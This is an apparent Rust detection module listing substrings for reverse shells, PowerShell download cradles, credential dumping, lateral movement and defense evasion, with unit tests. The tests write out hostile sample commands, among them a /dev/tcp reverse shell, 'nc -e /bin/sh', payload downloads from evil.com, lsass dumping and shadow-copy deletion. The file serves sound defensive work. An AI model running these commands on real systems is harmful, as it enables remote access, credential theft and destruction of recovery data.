/// Substrings indicative of reverse-shell command lines.
///
/// Sources:
/// - PayloadsAllTheThings — reverse shell cheat sheet (all patterns below confirmed present):
///   <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md>
/// - MITRE ATT&CK T1059 — Command and Scripting Interpreter:
///   <https://attack.mitre.org/techniques/T1059/>
/// - Red Canary — "How Process Streams Can Help You Detect Linux Threats"
///   (universal reverse shell detection via `*sh` + socket on stdin/stdout):
///   <https://redcanary.com/blog/threat-detection/process-streams/>
pub const REVERSE_SHELL_PATTERNS: &[&str] = &[
    "bash -i",
    "sh -i",
    "pty.spawn",
    "nc -e",
    "nc -c",
    "ncat -e",
    "/bin/sh -i",
    "python -c",
    "perl -e",
    "ruby -e",
    "lua -e",
    "php -r",
    "socat exec",
    "openssl s_client",
];

/// Substrings indicative of PowerShell abuse / download-cradles.
///
/// Sources:
/// - MITRE ATT&CK T1059.001 — PowerShell:
///   <https://attack.mitre.org/techniques/T1059/001/>
/// - Red Canary — "Encode All the Things! Investigating PowerShell Attacks"
///   (IEX, .DownloadString, -encodedcommand detection):
///   <https://redcanary.com/blog/threat-detection/investigating-powershell-attacks/>
/// - Red Canary Threat Detection Report — PowerShell technique (updated annually,
///   detection analytics for -nop, -noni, iex, downloadstring, EncodedCommand):
///   <https://redcanary.com/threat-detection-report/techniques/powershell/>
/// - Mandiant — Daniel Bohannon & Lee Holmes, "Revoke-Obfuscation: PowerShell
///   Obfuscation Detection Using Science" (Black Hat USA 2017):
///   <https://www.mandiant.com/resources/blog/revoke-obfuscation-powershell>
/// - Mandiant — "Greater Visibility Through PowerShell Logging" (module logging,
///   Script Block Logging, and transcription as detection sources):
///   <https://www.mandiant.com/resources/blog/greater-visibility>
pub const POWERSHELL_ABUSE_PATTERNS: &[&str] = &[
    "IEX",
    "Invoke-Expression",
    "DownloadString",
    "WebClient",
    "Net.WebRequest",
    "-EncodedCommand",
    "-enc ",
    "-ep bypass",
    "-ExecutionPolicy Bypass",
    "FromBase64String",
    "Invoke-Mimikatz",
    "Invoke-Shellcode",
];

/// Substrings indicative of file-download tool usage.
///
/// Sources:
/// - MITRE ATT&CK T1105 — Ingress Tool Transfer:
///   <https://attack.mitre.org/techniques/T1105/>
/// - SANS ISC — Xavier Mertens, "A Suspicious Use of certutil.exe" (2018):
///   <https://isc.sans.edu/diary/A+Suspicious+Use+of+certutil.exe/23517>
/// - Red Canary Threat Detection Report — Ingress Tool Transfer (certutil,
///   bitsadmin download abuse):
///   <https://redcanary.com/threat-detection-report/techniques/ingress-tool-transfer/>
/// - Cyber Triage — "DFIR Breakdown: Using Certutil To Download Attack Tools"
///   (CryptnetURLCache as a persistent artifact of certutil downloads):
///   <https://www.cybertriage.com/blog/dfir-breakdown-using-certutil-to-download-attack-tools/>
/// - MITRE ATT&CK T1218.005 — System Binary Proxy Execution: Mshta:
///   <https://attack.mitre.org/techniques/T1218/005/>
pub const DOWNLOAD_TOOL_PATTERNS: &[&str] = &[
    "certutil -urlcache",
    "certutil -decode",
    "bitsadmin /transfer",
    "wget ",
    "curl ",
    "Invoke-WebRequest",
    "Start-BitsTransfer",
    "mshta http",
    "regsvr32 /s /n /u /i:http",
];

/// Returns `true` if `cmd` contains a reverse-shell pattern (case-insensitive).
pub fn is_reverse_shell_pattern(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    REVERSE_SHELL_PATTERNS
        .iter()
        .any(|p| lower.contains(&p.to_ascii_lowercase()))
}

/// Returns `true` if `cmd` contains a PowerShell abuse pattern (case-insensitive).
pub fn is_powershell_abuse(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    POWERSHELL_ABUSE_PATTERNS
        .iter()
        .any(|p| lower.contains(&p.to_ascii_lowercase()))
}

/// Returns `true` if `cmd` contains a download-tool usage pattern (case-insensitive).
pub fn is_download_tool_usage(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    DOWNLOAD_TOOL_PATTERNS
        .iter()
        .any(|p| lower.contains(&p.to_ascii_lowercase()))
}

/// Substrings indicative of WMI-based code execution or lateral movement.
///
/// These patterns represent WMI invocations that have no common legitimate use and are
/// almost exclusively seen in offensive tradecraft. Generic WMI queries (`Get-WmiObject`,
/// `wmic os get`) are intentionally excluded — they are used routinely by administrators
/// and would produce unacceptable false-positive rates. Shadow-copy deletion via WMI is
/// covered by [`DEFENSE_EVASION_PATTERNS`] and [`SHADOW_COPY_DELETION_PATTERNS`].
///
/// Sources:
/// - MITRE ATT&CK T1047 — Windows Management Instrumentation:
///   <https://attack.mitre.org/techniques/T1047/>
/// - MITRE ATT&CK T1021.006 — Remote Services: Windows Remote Management (WMI lateral
///   movement via `wmic /node:`):
///   <https://attack.mitre.org/techniques/T1021/006/>
/// - MITRE ATT&CK T1562.001 — Impair Defenses: Disable or Modify Tools (`wmic product`
///   used to silently uninstall AV/EDR):
///   <https://attack.mitre.org/techniques/T1562/001/>
/// - Red Canary — "Detecting WMI-Based Command Execution" (process creation via
///   `Win32_Process.Create`, type-accelerator abuse):
///   <https://redcanary.com/blog/threat-detection/wmi-command-execution/>
pub const WMI_ABUSE_PATTERNS: &[&str] = &[
    "wmic process call create", // T1047: process creation bypassing parent-child EDR visibility
    "wmic /node:",              // T1021.006: remote WMI lateral movement
    "Invoke-WMIMethod",         // T1047: WMI method dispatch (typically Win32_Process.Create)
    "Invoke-CimMethod",         // T1047: CIM method dispatch
    "[wmiclass]", // T1047: PowerShell WMI type-accelerator (e.g. [wmiclass]"Win32_Process")
    "wmic product where", // T1562.001: silent AV/EDR uninstall via WMI product call
];

pub const CREDENTIAL_DUMP_PATTERNS: &[&str] = &[
    "procdump -ma",
    "procdump64 -ma",
    "sekurlsa::",
    "lsadump::",
    "kerberos::",
    "MiniDump",
    "comsvcs.dll",
    "Invoke-Mimikatz",
    "pypykatz",
    "wce -w",
    "gsecdump",
    "fgdump",
    "pwdump",
    "Out-Minidump",
    "ntds.dit",
    "vaultcmd /listcreds",
];

pub const RECON_PATTERNS: &[&str] = &[
    "net user",
    "net group",
    "net localgroup",
    "net accounts",
    "whoami",
    "ipconfig",
    "arp -a",
    "arp -n",
    "systeminfo",
    "hostname",
    "nltest",
    "nslookup",
    "route print",
    "netstat",
    "tasklist",
    "quser",
    "query user",
    "wmic useraccount",
    "wmic os get",
    "wmic computersystem",
    "wmic cpu",
    "Get-WmiObject",
    "gwmi ",
    "Get-ADUser",
    "Get-ADComputer",
    "Get-ADGroupMember",
];

pub const LATERAL_MOVEMENT_PATTERNS: &[&str] = &[
    "psexec",
    "psexec64",
    "wmiexec",
    "smbexec",
    "dcomexec",
    "atexec",
    "Enter-PSSession",
    "Invoke-Command -ComputerName",
    "New-PSSession",
    "winrm invoke",
    "sc \\\\",
    "at \\\\",
    "schtasks /create /s",
    "net use \\\\",
    "mmc \\\\",
];

pub const DEFENSE_EVASION_PATTERNS: &[&str] = &[
    "vssadmin delete shadows",
    "vssadmin resize shadowstorage",
    "bcdedit /set recoveryenabled no",
    "bcdedit /set bootstatuspolicy ignoreallfailures",
    "wmic shadowcopy delete",
    "Get-WmiObject Win32_Shadowcopy | Remove",
    "Set-MpPreference -DisableRealtimeMonitoring",
    "Set-MpPreference -DisableAntiSpyware",
    "Set-MpPreference -DisableAntiVirus",
    "Add-MpPreference -ExclusionPath",
    "netsh advfirewall set allprofiles state off",
    "netsh firewall set opmode mode=disable",
    "net stop \"windows defender",
    "sc stop WinDefend",
    "DisableAntiSpyware",
    "wevtutil sl /e:false",
];

/// Returns `true` if `cmd` contains a WMI-based execution or abuse pattern (case-insensitive).
pub fn is_wmi_abuse(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    WMI_ABUSE_PATTERNS
        .iter()
        .any(|p| lower.contains(&p.to_ascii_lowercase()))
}

/// Returns `true` if `cmd` contains a credential-dumping pattern (case-insensitive).
pub fn is_credential_dumping_command(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    CREDENTIAL_DUMP_PATTERNS
        .iter()
        .any(|p| lower.contains(&p.to_ascii_lowercase()))
}

/// Returns `true` if `cmd` contains a discovery/reconnaissance pattern (case-insensitive).
pub fn is_recon_command(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    RECON_PATTERNS
        .iter()
        .any(|p| lower.contains(&p.to_ascii_lowercase()))
}

/// Returns `true` if `cmd` contains a lateral-movement pattern (case-insensitive).
pub fn is_lateral_movement_command(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    LATERAL_MOVEMENT_PATTERNS
        .iter()
        .any(|p| lower.contains(&p.to_ascii_lowercase()))
}

/// Returns `true` if `cmd` contains a defense-evasion pattern (case-insensitive).
pub fn is_defense_evasion_command(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    DEFENSE_EVASION_PATTERNS
        .iter()
        .any(|p| lower.contains(&p.to_ascii_lowercase()))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn reverse_shell_patterns_contains_bash_i() {
        assert!(REVERSE_SHELL_PATTERNS.contains(&"bash -i"));
    }

    #[test]
    fn reverse_shell_patterns_contains_nc_e() {
        assert!(REVERSE_SHELL_PATTERNS.contains(&"nc -e"));
    }

    #[test]
    fn powershell_abuse_contains_iex() {
        assert!(POWERSHELL_ABUSE_PATTERNS.contains(&"IEX"));
    }

    #[test]
    fn powershell_abuse_contains_encoded_command() {
        assert!(POWERSHELL_ABUSE_PATTERNS.contains(&"-EncodedCommand"));
    }

    #[test]
    fn download_tool_contains_certutil_urlcache() {
        assert!(DOWNLOAD_TOOL_PATTERNS.contains(&"certutil -urlcache"));
    }

    #[test]
    fn download_tool_contains_wget() {
        assert!(DOWNLOAD_TOOL_PATTERNS.contains(&"wget "));
    }

    #[test]
    fn detects_bash_i_reverse_shell() {
        assert!(is_reverse_shell_pattern(
            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
        ));
    }

    #[test]
    fn detects_nc_e_reverse_shell() {
        assert!(is_reverse_shell_pattern("nc -e /bin/sh 10.0.0.1 4444"));
    }

    #[test]
    fn detects_python_c_pty_spawn() {
        assert!(is_reverse_shell_pattern(
            "python -c 'import pty; pty.spawn(\"/bin/sh\")'"
        ));
    }

    #[test]
    fn detects_case_insensitive_nc_e() {
        assert!(is_reverse_shell_pattern("NC -E /bin/sh attacker 4444"));
    }

    #[test]
    fn does_not_flag_benign_command() {
        assert!(!is_reverse_shell_pattern("ls -la /tmp"));
    }

    #[test]
    fn empty_string_not_reverse_shell() {
        assert!(!is_reverse_shell_pattern(""));
    }

    #[test]
    fn detects_iex_downloadstring() {
        assert!(is_powershell_abuse(
            "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/ps.ps1')"
        ));
    }

    #[test]
    fn detects_encoded_command_flag() {
        assert!(is_powershell_abuse("powershell.exe -EncodedCommand AAAA"));
    }

    #[test]
    fn detects_ep_bypass() {
        assert!(is_powershell_abuse(
            "powershell -ep bypass -File stager.ps1"
        ));
    }

    #[test]
    fn does_not_flag_benign_powershell() {
        assert!(!is_powershell_abuse("Get-Process"));
    }

    #[test]
    fn empty_string_not_powershell_abuse() {
        assert!(!is_powershell_abuse(""));
    }

    #[test]
    fn detects_certutil_urlcache() {
        assert!(is_download_tool_usage(
            "certutil -urlcache -f http://evil.com/payload.exe payload.exe"
        ));
    }

    #[test]
    fn detects_bitsadmin_transfer() {
        assert!(is_download_tool_usage(
            "bitsadmin /transfer job http://evil.com/x.exe C:\\x.exe"
        ));
    }

    #[test]
    fn detects_wget_uppercase() {
        assert!(is_download_tool_usage("WGET http://evil.com/malware"));
    }

    #[test]
    fn does_not_flag_dir_command() {
        assert!(!is_download_tool_usage("dir C:\\Windows\\System32"));
    }

    #[test]
    fn empty_string_not_download_tool() {
        assert!(!is_download_tool_usage(""));
    }

    // --- WMI_ABUSE_PATTERNS / is_wmi_abuse ---
    #[test]
    fn wmi_patterns_contains_wmic_process_call() {
        assert!(WMI_ABUSE_PATTERNS.contains(&"wmic process call create"));
    }
    #[test]
    fn wmi_patterns_contains_invoke_wmimethod() {
        assert!(WMI_ABUSE_PATTERNS.contains(&"Invoke-WMIMethod"));
    }
    #[test]
    fn wmi_patterns_contains_wmic_node_remote() {
        assert!(WMI_ABUSE_PATTERNS.contains(&"wmic /node:"));
    }
    #[test]
    fn detects_wmic_process_call_create() {
        assert!(is_wmi_abuse(
            "wmic process call create \"cmd.exe /c whoami\""
        ));
    }
    #[test]
    fn detects_invoke_wmimethod() {
        assert!(is_wmi_abuse(
            "Invoke-WMIMethod -Class Win32_Process -Name Create"
        ));
    }
    #[test]
    fn detects_wmic_node_lateral_movement() {
        assert!(is_wmi_abuse(
            "wmic /node:192.168.1.5 process call create cmd"
        ));
    }
    #[test]
    fn detects_wmiclass_type_accelerator() {
        assert!(is_wmi_abuse(
            "$wmi = [wmiclass]\"Win32_Process\"; $wmi.Create(\"calc.exe\")"
        ));
    }
    #[test]
    fn detects_wmic_product_uninstall_av() {
        assert!(is_wmi_abuse(
            "wmic product where name=\"Carbon Black\" call uninstall"
        ));
    }
    #[test]
    fn wmi_is_case_insensitive() {
        assert!(is_wmi_abuse("WMIC PROCESS CALL CREATE \"cmd.exe\""));
    }
    #[test]
    fn does_not_flag_get_process_as_wmi() {
        assert!(!is_wmi_abuse("Get-Process svchost"));
    }
    #[test]
    fn empty_string_not_wmi_abuse() {
        assert!(!is_wmi_abuse(""));
    }

    // --- CREDENTIAL_DUMP_PATTERNS / is_credential_dumping_command ---
    #[test]
    fn cred_dump_patterns_contains_procdump_ma() {
        assert!(CREDENTIAL_DUMP_PATTERNS.contains(&"procdump -ma"));
    }
    #[test]
    fn cred_dump_patterns_contains_sekurlsa() {
        assert!(CREDENTIAL_DUMP_PATTERNS.contains(&"sekurlsa::"));
    }
    #[test]
    fn detects_procdump_ma_lsass() {
        assert!(is_credential_dumping_command(
            "procdump -ma lsass.exe lsass.dmp"
        ));
    }
    #[test]
    fn detects_sekurlsa_logonpasswords() {
        assert!(is_credential_dumping_command("sekurlsa::logonpasswords"));
    }
    #[test]
    fn detects_comsvcs_minidump() {
        assert!(is_credential_dumping_command(
            "rundll32 comsvcs.dll MiniDump 624 lsass.dmp full"
        ));
    }
    #[test]
    fn detects_invoke_mimikatz_cred_dump() {
        assert!(is_credential_dumping_command("Invoke-Mimikatz -DumpCreds"));
    }
    #[test]
    fn does_not_flag_dir_as_cred_dump() {
        assert!(!is_credential_dumping_command("dir C:\\Windows"));
    }
    #[test]
    fn empty_string_not_cred_dump() {
        assert!(!is_credential_dumping_command(""));
    }

    // --- RECON_PATTERNS / is_recon_command ---
    #[test]
    fn recon_patterns_contains_net_user() {
        assert!(RECON_PATTERNS.contains(&"net user"));
    }
    #[test]
    fn recon_patterns_contains_whoami() {
        assert!(RECON_PATTERNS.contains(&"whoami"));
    }
    #[test]
    fn detects_net_user_domain() {
        assert!(is_recon_command("net user /domain"));
    }
    #[test]
    fn detects_whoami_priv() {
        assert!(is_recon_command("whoami /priv"));
    }
    #[test]
    fn detects_ipconfig_all() {
        assert!(is_recon_command("ipconfig /all"));
    }
    #[test]
    fn detects_arp_a() {
        assert!(is_recon_command("arp -a"));
    }
    #[test]
    fn detects_systeminfo() {
        assert!(is_recon_command("systeminfo"));
    }
    #[test]
    fn detects_wmic_os_get() {
        assert!(is_recon_command("wmic os get Caption,Version,BuildNumber"));
    }
    #[test]
    fn detects_wmic_computersystem() {
        assert!(is_recon_command("wmic computersystem get Name,Domain"));
    }
    #[test]
    fn detects_get_wmiobject_recon() {
        assert!(is_recon_command("Get-WmiObject Win32_ComputerSystem"));
    }
    #[test]
    fn detects_gwmi_shorthand() {
        assert!(is_recon_command(
            "gwmi Win32_OperatingSystem | Select Caption"
        ));
    }
    #[test]
    fn does_not_flag_notepad_as_recon() {
        assert!(!is_recon_command("notepad.exe C:\\file.txt"));
    }
    #[test]
    fn empty_string_not_recon() {
        assert!(!is_recon_command(""));
    }

    // --- LATERAL_MOVEMENT_PATTERNS / is_lateral_movement_command ---
    #[test]
    fn lateral_patterns_contains_psexec() {
        assert!(LATERAL_MOVEMENT_PATTERNS.contains(&"psexec"));
    }
    #[test]
    fn lateral_patterns_contains_enter_pssession() {
        assert!(LATERAL_MOVEMENT_PATTERNS.contains(&"Enter-PSSession"));
    }
    #[test]
    fn detects_psexec_unc() {
        assert!(is_lateral_movement_command("psexec \\\\server cmd.exe"));
    }
    #[test]
    fn detects_wmiexec() {
        assert!(is_lateral_movement_command("wmiexec.py admin@192.168.1.1"));
    }
    #[test]
    fn detects_enter_pssession() {
        assert!(is_lateral_movement_command(
            "Enter-PSSession -ComputerName dc01"
        ));
    }
    #[test]
    fn detects_smbexec() {
        assert!(is_lateral_movement_command("smbexec.py domain/user@host"));
    }
    #[test]
    fn does_not_flag_ping_as_lateral() {
        assert!(!is_lateral_movement_command("ping 192.168.1.1"));
    }
    #[test]
    fn empty_string_not_lateral_movement() {
        assert!(!is_lateral_movement_command(""));
    }

    // --- DEFENSE_EVASION_PATTERNS / is_defense_evasion_command ---
    #[test]
    fn defense_evasion_patterns_contains_vssadmin() {
        assert!(DEFENSE_EVASION_PATTERNS.contains(&"vssadmin delete shadows"));
    }
    #[test]
    fn defense_evasion_patterns_contains_bcdedit() {
        assert!(DEFENSE_EVASION_PATTERNS.contains(&"bcdedit /set recoveryenabled no"));
    }
    #[test]
    fn detects_vssadmin_delete_shadows() {
        assert!(is_defense_evasion_command(
            "vssadmin delete shadows /all /quiet"
        ));
    }
    #[test]
    fn detects_bcdedit_recovery() {
        assert!(is_defense_evasion_command(
            "bcdedit /set recoveryenabled no"
        ));
    }
    #[test]
    fn detects_set_mppreference_disable() {
        assert!(is_defense_evasion_command(
            "Set-MpPreference -DisableRealtimeMonitoring $true"
        ));
    }
    #[test]
    fn detects_netsh_firewall_disable() {
        assert!(is_defense_evasion_command(
            "netsh advfirewall set allprofiles state off"
        ));
    }
    #[test]
    fn does_not_flag_net_start_as_evasion() {
        assert!(!is_defense_evasion_command(
            "net start \"network location awareness\""
        ));
    }
    #[test]
    fn empty_string_not_defense_evasion() {
        assert!(!is_defense_evasion_command(""));
    }
}
